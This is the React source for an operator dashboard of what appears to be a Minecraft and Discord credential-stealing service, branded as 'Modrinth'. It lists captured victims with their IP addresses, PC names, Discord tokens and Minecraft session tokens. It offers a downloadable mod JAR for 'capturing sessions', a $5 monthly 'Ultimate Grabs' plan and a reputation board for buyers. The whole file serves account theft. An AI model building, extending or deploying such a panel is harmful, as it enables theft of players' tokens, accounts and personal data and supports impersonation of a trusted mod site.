'use client';

import { useState, useEffect, useCallback } from 'react';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function Dashboard({ userEmail }) {
  const [grabCount, setGrabCount] = useState(0);

  useEffect(() => {
    if (!userEmail) return;
    fetch(`/api/grabs?owner_email=${encodeURIComponent(userEmail)}`)
      .then(r => r.json())
      .then(d => setGrabCount(d.grabs?.length || 0))
      .catch(() => {});
  }, [userEmail]);

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening.</h1>
      <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
      <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
        {[
          { icon: '👤', label: 'GRABS', value: String(grabCount), sub: grabCount === 0 ? 'No grabs yet' : `${grabCount} total captures` },
          { icon: '💬', label: 'DISCORD', value: '—', sub: 'Webhook active' },
          { icon: '🌐', label: 'STATUS', value: '✓', sub: 'Online' },
        ].map((c, i) => (
          <div key={i} style={{ background: colors.panel, borderRadius: 10, padding: '18px 20px', flex: 1, border: `1px solid ${colors.border}` }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: colors.textDim, fontSize: 12, marginBottom: 10 }}>
              <span style={{ fontSize: 14 }}>{c.icon}</span> {c.label}
            </div>
            <div style={{ fontSize: 28, fontWeight: 700, color: colors.text }}>{c.value}</div>
            <div style={{ fontSize: 12, color: colors.textDim, marginTop: 4 }}>{c.sub}</div>
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: 14 }}>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
          </div>
          <div style={{ height: 160, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
            <span style={{ fontSize: 13 }}>{grabCount === 0 ? 'No captures yet' : 'Check Grabs tab'}</span>
          </div>
        </div>
        <div style={{ width: 240 }}>
          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>Quick Actions</div>
          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 16 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>Download the mod and start capturing sessions.</div>
            <a href="#build" style={{ display: 'block', textAlign: 'center', padding: '8px 0', background: colors.green, color: '#000', borderRadius: 6, fontSize: 12, fontWeight: 600, textDecoration: 'none' }}>Download Mod</a>
          </div>
        </div>
      </div>
    </div>
  );
}

function Grabs({ onSelectGrab, userEmail }) {
  const [grabs, setGrabs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');

  useEffect(() => {
    if (!userEmail) { setLoading(false); return; }
    fetch(`/api/grabs?owner_email=${encodeURIComponent(userEmail)}`)
      .then(r => r.json())
      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
      .catch(() => setLoading(false));
  }, [userEmail]);

  const formatTime = (t) => {
    if (!t) return '';
    const d = new Date(t);
    const now = new Date();
    const diff = Math.floor((now - d) / 1000);
    if (diff < 60) return 'Just now';
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
    return d.toLocaleDateString();
  };

  const filtered = grabs.filter(g =>
    g.minecraft_username?.toLowerCase().includes(search.toLowerCase()) ||
    g.discord_username?.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>Sessions</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 20px 0' }}>{grabs.length} captured</p>
      <div style={{ marginBottom: 20, display: 'flex', justifyContent: 'flex-end' }}>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search..."
          style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', color: colors.text, fontSize: 13, outline: 'none', width: 220 }}
        />
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
        {filtered.map((g) => (
          <div
            key={g.id}
            onClick={() => onSelectGrab(g)}
            style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', transition: 'all 0.15s ease' }}
            onMouseEnter={e => { e.currentTarget.style.borderColor = '#333'; e.currentTarget.style.background = '#15161e'; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = colors.panel; }}
          >
            <div style={{ width: 42, height: 42, borderRadius: 10, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
              <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
            </div>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
                <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
                  {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
                </span>
              </div>
              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
              {g.servers && (
                <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
                  🌐 {g.servers.split(',').filter(Boolean).length}
                </span>
              )}
              <span style={{ fontSize: 12, color: colors.textDim, whiteSpace: 'nowrap' }}>{formatTime(g.created_at)}</span>
              <span style={{ color: '#444', fontSize: 14 }}>›</span>
            </div>
          </div>
        ))}
        {filtered.length === 0 && !loading && (
          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>
            <div style={{ fontSize: 28, marginBottom: 8 }}>📭</div>
            No grabs yet
          </div>
        )}
      </div>
    </div>
  );
}

function GrabDetail({ grab, onBack }) {
  const [deleting, setDeleting] = useState(false);

  const handleDelete = async () => {
    setDeleting(true);
    await fetch(`/api/grabs/${grab.id}`, { method: 'DELETE' });
    onBack();
  };

  const mask = (val) => {
    if (!val || val === 'Unknown' || val === 'N/A' || val === '') return '—';
    if (val.length > 16) return val.substring(0, 8) + '••••' + val.substring(val.length - 4);
    return val;
  };

  const formatDate = (t) => {
    if (!t) return '—';
    return new Date(t).toLocaleString();
  };

  const servers = grab.servers ? grab.servers.split(',').filter(Boolean) : [];
  const osShort = grab.os?.includes('Windows') ? 'Windows' : grab.os?.includes('Mac') ? 'macOS' : grab.os?.includes('Linux') ? 'Linux' : grab.os || 'Unknown';

  return (
    <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
        <div onClick={onBack} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = colors.textDim}>← Back</div>
        <div onClick={handleDelete} style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, transition: 'opacity 0.15s' }} onMouseEnter={e => e.target.style.opacity = 0.8} onMouseLeave={e => e.target.style.opacity = 1}>🗑 Delete</div>
      </div>

      <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 28 }}>
        <div style={{ width: 56, height: 56, borderRadius: 12, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden', border: `1px solid ${colors.border}` }}>
          <img src={`https://mc-heads.net/avatar/${grab.minecraft_username}/56`} alt="" style={{ width: 56, height: 56 }} onError={e => { e.target.style.display = 'none'; }} />
        </div>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <span style={{ fontSize: 22, fontWeight: 700, color: colors.text }}>{grab.minecraft_username}</span>
            <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 11, padding: '3px 10px', borderRadius: 5, fontWeight: 600 }}>🖥 {osShort}</span>
          </div>
          <div style={{ fontSize: 13, color: colors.textDim, marginTop: 3 }}>{formatDate(grab.created_at)}</div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
        <GrabSection title="Environment" icon="💻">
          <InfoRow label="IP Address" value={grab.ip_address} />
          <InfoRow label="PC Name" value={grab.pc_name} />
          <InfoRow label="Operating System" value={grab.os} />
          <InfoRow label="OS Version" value={grab.os_version} />
          <InfoRow label="Country" value={grab.country} />
          <InfoRow label="Timezone" value={grab.timezone} />
          <InfoRow label="Language" value={grab.language} />
        </GrabSection>
        <GrabSection title="Discord Info" icon="💬">
          <InfoRow label="Discord Username" value={grab.discord_username} />
          <InfoRow label="Discord Token" value={mask(grab.discord_token)} full />
        </GrabSection>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
        <GrabSection title="Minecraft Session" icon="🎮">
          <InfoRow label="Session Token" value={mask(grab.session_id)} full />
          <InfoRow label="Session Start" value={grab.session_start ? formatDate(grab.session_start) : '—'} />
          <InfoRow label="Client Version" value={grab.client_version} />
          <InfoRow label="Java Version" value={grab.java_version} />
        </GrabSection>
        <GrabSection title="System Info" icon="⚙️">
          <InfoRow label="CPU" value={grab.cpu} />
          <InfoRow label="RAM" value={grab.ram} />
          <InfoRow label="GPU" value={grab.gpu} />
          <InfoRow label="Screen" value={grab.screen_resolution} />
          <InfoRow label="Disk" value={grab.disk_space} />
          <InfoRow label="Desktop" value={grab.desktop_env} />
        </GrabSection>
      </div>

      {servers.length > 0 && (
        <GrabSection title={`Servers (${servers.length})`} icon="🌐">
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, padding: '4px 0' }}>
            {servers.map((s, i) => (
              <div key={i} style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', fontSize: 13, color: colors.text, display: 'flex', alignItems: 'center', gap: 6 }}>
                🌐 {s.trim()}
              </div>
            ))}
          </div>
        </GrabSection>
      )}
    </div>
  );
}

function GrabSection({ title, icon, children }) {
  return (
    <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: 20 }}>
      <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14, display: 'flex', alignItems: 'center', gap: 6 }}>
        <span>{icon}</span> {title}
      </div>
      {children}
    </div>
  );
}

function InfoRow({ label, value, full }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: `1px solid ${colors.border}`, fontSize: 13 }}>
      <span style={{ color: colors.textDim, flexShrink: 0 }}>{label}</span>
      <span style={{ color: colors.text, textAlign: 'right', maxWidth: full ? '65%' : '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{value || '—'}</span>
    </div>
  );
}

function Build({ userEmail }) {
  const [email, setEmail] = useState(userEmail || '');
  const [saved, setSaved] = useState(false);

  const handleSave = () => {
    localStorage.setItem('consentmod_email', email);
    setSaved(true);
    setTimeout(() => setSaved(false), 2000);
  };

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>

      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
          <span>📧</span> Your Email
        </div>
        <p style={{ fontSize: 12, color: colors.textDim, margin: '0 0 12px 0' }}>Your grabs will be linked to this email. Only you can see them.</p>
        <div style={{ display: 'flex', gap: 8 }}>
          <input
            value={email}
            onChange={e => setEmail(e.target.value)}
            placeholder="your@email.com"
            style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
          />
          <button onClick={handleSave} style={{ background: saved ? colors.green : 'transparent', color: saved ? '#000' : colors.text, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
            {saved ? '✓ Saved' : 'Save'}
          </button>
        </div>
      </div>

      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
          <span>🔨</span> Build Mod
        </div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
          <div style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
            Fabric 1.21.11
            <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
          </div>
        </div>
        <a href="/mods/consentmod-1.0.0.jar" download style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 8, textDecoration: 'none' }}>
          <span>↓</span> Download JAR
        </a>
      </div>

      <div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
        <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <span style={{ fontSize: 20 }}>📄</span>
            <div>
              <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>fabric-1.21.11.jar</div>
              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>May 25, 2026 · 16.0 MB</div>
            </div>
          </div>
          <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
            <span>↓</span> Download
          </button>
        </div>
      </div>
    </div>
  );
}

function Plans() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
      <div style={{ maxWidth: 400 }}>
        <div style={{ background: colors.panel, border: `1px solid ${colors.green}`, borderRadius: 12, padding: 28, position: 'relative' }}>
          <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
          <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
          {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
              <span style={{ color: colors.green }}>✓</span> {f}
            </div>
          ))}
          <button disabled style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
        </div>
      </div>
    </div>
  );
}

function RepPage({ username, userEmail }) {
  const [reviews, setReviews] = useState([]);
  const [newRep, setNewRep] = useState('');
  const [editingId, setEditingId] = useState(null);
  const [editText, setEditText] = useState('');
  const [menuOpen, setMenuOpen] = useState(null);
  const [filter, setFilter] = useState('Newest');
  const [newTag, setNewTag] = useState('Good');
  const [loading, setLoading] = useState(true);

  const fetchReps = useCallback(async () => {
    try {
      const res = await fetch('/api/reps');
      const data = await res.json();
      setReviews(data.reps || []);
    } catch {}
    setLoading(false);
  }, []);

  useEffect(() => { fetchReps(); }, [fetchReps]);

  const handlePost = async () => {
    if (!newRep.trim() || !userEmail || !username) return;
    const res = await fetch('/api/reps', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_email: userEmail, username, tag: newTag, text: newRep.trim() }),
    });
    if (res.ok) {
      setNewRep('');
      fetchReps();
    }
  };

  const handleDelete = async (id) => {
    await fetch(`/api/reps/${id}?user_email=${encodeURIComponent(userEmail)}`, { method: 'DELETE' });
    setMenuOpen(null);
    fetchReps();
  };

  const handleEdit = (id) => {
    const r = reviews.find(r => r.id === id);
    setEditingId(id);
    setEditText(r.text);
    setMenuOpen(null);
  };

  const handleSaveEdit = async (id) => {
    await fetch(`/api/reps/${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: editText, user_email: userEmail }),
    });
    setEditingId(null);
    setEditText('');
    fetchReps();
  };

  const myRep = reviews.find(r => r.user_email === userEmail);

  const filtered = filter === 'Good' ? reviews.filter(r => r.tag === 'Good') :
    filter === 'Bad' ? reviews.filter(r => r.tag === 'Bad') :
    filter === 'Mine' ? reviews.filter(r => r.user_email === userEmail) :
    filter === 'Oldest' ? [...reviews].reverse() :
    reviews;

  const formatTime = (t) => {
    if (!t) return '';
    const d = new Date(t);
    const now = new Date();
    const diff = Math.floor((now - d) / 1000);
    if (diff < 60) return 'Just now';
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return d.toLocaleDateString();
  };

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>+Rep</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: 0 }}>{reviews.length} reviews from users.</p>
      </div>

      {userEmail ? (
        myRep ? (
          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>You already posted a rep</div>
            <p style={{ fontSize: 13, color: colors.textDim, margin: 0 }}>You can edit or delete your existing rep below.</p>
          </div>
        ) : (
          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Add your rep</div>
            <div style={{ display: 'flex', gap: 8, marginBottom: 10 }}>
              <button onClick={() => setNewTag('Good')} style={{ background: newTag === 'Good' ? colors.green : 'transparent', color: newTag === 'Good' ? '#000' : colors.textDim, border: `1px solid ${newTag === 'Good' ? colors.green : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👍 Good</button>
              <button onClick={() => setNewTag('Bad')} style={{ background: newTag === 'Bad' ? '#ef4444' : 'transparent', color: newTag === 'Bad' ? '#fff' : colors.textDim, border: `1px solid ${newTag === 'Bad' ? '#ef4444' : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👎 Bad</button>
            </div>
            <div style={{ display: 'flex', gap: 8 }}>
              <input
                value={newRep}
                onChange={e => setNewRep(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handlePost()}
                placeholder="Write a review..."
                style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
              />
              <button onClick={handlePost} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Confirm</button>
            </div>
          </div>
        )
      ) : (
        <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20, textAlign: 'center', color: colors.textDim, fontSize: 13 }}>
          Sign in to leave a review
        </div>
      )}

      <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
        {['Newest', 'Oldest', 'Good', 'Bad', 'Mine'].map((f) => (
          <button key={f} onClick={() => setFilter(f)} style={{ background: filter === f ? colors.text : 'transparent', color: filter === f ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
        ))}
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {filtered.map((r) => (
          <div key={r.id} style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: '16px 20px', position: 'relative' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
              <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{r.username}</span>
              <span style={{ background: '#1a2a1a', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
              <span style={{ fontSize: 12, color: colors.textDim, marginLeft: 'auto' }}>{formatTime(r.created_at)}</span>
              {r.user_email === userEmail && (
                <div style={{ position: 'relative' }}>
                  <span onClick={() => setMenuOpen(menuOpen === r.id ? null : r.id)} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 16, padding: '0 4px' }}>⋯</span>
                  {menuOpen === r.id && (
                    <div style={{ position: 'absolute', top: '100%', right: 0, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: 6, zIndex: 10, minWidth: 100 }}>
                      <div onClick={() => handleEdit(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: colors.text, cursor: 'pointer', borderRadius: 4 }}>Edit</div>
                      <div onClick={() => handleDelete(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: '#ef4444', cursor: 'pointer', borderRadius: 4 }}>Delete</div>
                    </div>
                  )}
                </div>
              )}
            </div>
            {editingId === r.id ? (
              <div style={{ display: 'flex', gap: 8 }}>
                <input value={editText} onChange={e => setEditText(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSaveEdit(r.id)} style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 14, outline: 'none' }} />
                <button onClick={() => handleSaveEdit(r.id)} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Save</button>
              </div>
            ) : (
              <p style={{ fontSize: 14, color: colors.text, margin: 0 }}>{r.text}</p>
            )}
          </div>
        ))}
        {filtered.length === 0 && !loading && (
          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 40 }}>No reviews yet</div>
        )}
      </div>
    </div>
  );
}

function LiveCaptures() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Live Captures</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Real-time session captures from your servers.</p>
      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
        <span style={{ fontSize: 28, marginBottom: 8 }}>📡</span>
        <span style={{ fontSize: 13 }}>No live captures</span>
      </div>
    </div>
  );
}

export default function DashboardPage() {
  const [page, setPage] = useState('dashboard');
  const [user, setUser] = useState(null);
  const [selectedGrab, setSelectedGrab] = useState(null);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => { if (d.user) setUser(d.user); })
      .catch(() => {});
  }, []);

  const username = user?.name || 'You';
  const userEmail = user?.email || '';

  const handleSelectGrab = (grab) => {
    setSelectedGrab(grab);
    setPage('grabdetail');
  };

  const handleBackFromGrab = () => {
    setSelectedGrab(null);
    setPage('grabs');
  };

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
          <NavItem icon="⚡" label="Grabs" active={page === 'grabs' || page === 'grabdetail'} onClick={() => { setSelectedGrab(null); setPage('grabs'); }} />
          <NavItem icon="🔨" label="Build" active={page === 'build'} onClick={() => setPage('build')} />
          <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
          <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
          <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      {page === 'dashboard' && <Dashboard userEmail={userEmail} />}
      {page === 'grabs' && <Grabs onSelectGrab={handleSelectGrab} userEmail={userEmail} />}
      {page === 'grabdetail' && selectedGrab && <GrabDetail grab={selectedGrab} onBack={handleBackFromGrab} />}
      {page === 'build' && <Build userEmail={userEmail} />}
      {page === 'plans' && <Plans />}
      {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
      {page === 'live' && <LiveCaptures />}
    </div>
  );
}
